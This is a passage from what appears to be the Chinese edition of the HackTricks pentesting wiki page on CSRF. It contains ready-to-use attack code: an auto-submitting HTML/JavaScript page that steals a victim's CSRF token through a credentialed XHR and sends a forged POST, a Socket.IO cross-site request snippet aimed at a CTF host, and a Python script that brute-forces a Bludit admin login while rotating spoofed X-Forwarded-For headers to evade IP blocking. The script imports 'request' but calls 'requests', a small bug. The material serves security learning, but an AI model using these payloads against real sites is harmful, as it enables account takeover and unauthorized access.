&lt;button type="submit"&gt;Submit&lt;/button&gt;
&lt;/form&gt;
</code></pre>
<h3 id="post通过ajax窃取csrf令牌并使用表单发送post"><a class="header" href="#post通过ajax窃取csrf令牌并使用表单发送post"><strong>POST通过Ajax窃取CSRF令牌并使用表单发送POST</strong></a></h3>
<pre><code class="language-html">&lt;body onload="getData()"&gt;

&lt;form id="form" action="http://google.com?param=VALUE" method="POST" enctype="multipart/form-data"&gt;
&lt;input type="hidden" name="username" value="root"/&gt;
&lt;input type="hidden" name="status" value="on"/&gt;
&lt;input type="hidden" id="findtoken" name="token" value=""/&gt;
&lt;input type="submit" value="valider"/&gt;
&lt;/form&gt;

&lt;script&gt;
var x = new XMLHttpRequest();
function getData() {
x.withCredentials = true;
x.open("GET","http://google.com?param=VALUE",true);
x.send(null);
}
x.onreadystatechange = function() {
if (x.readyState == XMLHttpRequest.DONE) {
var token = x.responseText.match(/name="token" value="(.+)"/)[1];
document.getElementById("findtoken").value = token;
document.getElementById("form").submit();
}
}
&lt;/script&gt;
</code></pre>
<h3 id="csrf与socketio"><a class="header" href="#csrf与socketio">CSRF与Socket.IO</a></h3>
<pre><code class="language-html">&lt;script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"&gt;&lt;/script&gt;
&lt;script&gt;
let socket = io('http://six.jh2i.com:50022/test');

const username = 'admin'

socket.on('connect', () =&gt; {
console.log('connected!');
socket.emit('join', {
room: username
});
socket.emit('my_room_event', {
data: '!flag',
room: username
})

});
&lt;/script&gt;
</code></pre>
<h2 id="csrf-登录暴力破解"><a class="header" href="#csrf-登录暴力破解">CSRF 登录暴力破解</a></h2>
<p>该代码可用于通过 CSRF 令牌对登录表单进行暴力破解（它还使用了 X-Forwarded-For 头来尝试绕过可能的 IP 黑名单）：</p>
<pre><code class="language-python">import request
import re
import random

URL = "http://10.10.10.191/admin/"
PROXY = { "http": "127.0.0.1:8080"}
SESSION_COOKIE_NAME = "BLUDIT-KEY"
USER = "fergus"
PASS_LIST="./words"

def init_session():
#Return CSRF + Session (cookie)
r = requests.get(URL)
csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-zA-Z0-9]*)"', r.text)
csrf = csrf.group(1)
session_cookie = r.cookies.get(SESSION_COOKIE_NAME)
return csrf, session_cookie

def login(user, password):
print(f"{user}:{password}")
csrf, cookie = init_session()
cookies = {SESSION_COOKIE_NAME: cookie}
data = {
"tokenCSRF": csrf,
"username": user,
"password": password,
"save": ""
}
headers = {
"X-Forwarded-For": f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
}
r = requests.post(URL, data=data, cookies=cookies, headers=headers, proxies=PROXY)
if "Username or password incorrect" in r.text:
return False
else:
print(f"FOUND {user} : {password}")
return True

with open(PASS_LIST, "r") as f:
for line in f:
login(USER, line.strip())
</code></pre>
<h2 id="tools"><a class="header" href="#tools">Tools <a href="#tools" id="tools"></a></a></h2>
<ul>
<li><a href="https://github.com/0xInfection/XSRFProbe">https://github.com/0xInfection/XSRFProbe</a></li>
<li><a href="https://github.com/merttasci/csrf-poc-generator">https://github.com/merttasci/csrf-poc-generator</a></li>
</ul>
<h2 id="references"><a class="header" href="#references">References</a></h2>
<ul>
<li><a href="https://portswigger.net/web-security/csrf">https://portswigger.net/web-security/csrf</a></li>
<li><a href="https://portswigger.net/web-security/csrf/bypassing-token-validation">https://portswigger.net/web-security/csrf/bypassing-token-validation</a></li>
<li><a href="https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses">https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses</a></li>
<li><a href="https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html">https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html</a></li>
</ul>
<p>​</p>
<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
<p>加入 <a href="https://discord.com/invite/N3FrSbmwdy"><strong>HackenProof Discord</strong></a> 服务器，与经验丰富的黑客和漏洞赏金猎人交流！</p>
<p><strong>黑客见解</strong><br />
参与深入探讨黑客的刺激与挑战的内容</p>
<p><strong>实时黑客新闻</strong><br />
通过实时新闻和见解，跟上快速变化的黑客世界</p>
<p><strong>最新公告</strong><br />
了解最新的漏洞赏金计划和重要平台更新</p>
<p><strong>加入我们</strong> <a href="https://discord.com/invite/N3FrSbmwdy"><strong>Discord</strong></a>，今天就开始与顶级黑客合作！</p>
<p>{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="../.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习与实践 GCP 黑客技术： <img src="../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>电报群组</strong></a> 或 <strong>在</strong> <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a>** 上关注我们。**</li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 分享黑客技巧。</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../pentesting-web/crlf-0d-0a.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../pentesting-web/dangling-markup-html-scriptless-injection/index.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../pentesting-web/crlf-0d-0a.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../pentesting-web/dangling-markup-html-scriptless-injection/index.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../elasticlunr.min.js"></script>
        <script src="../mark.min.js"></script>
        <script src="../searcher.js"></script>

        <script src="../clipboard.min.js"></script>
        <script src="../highlight.js"></script>
        <script src="../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
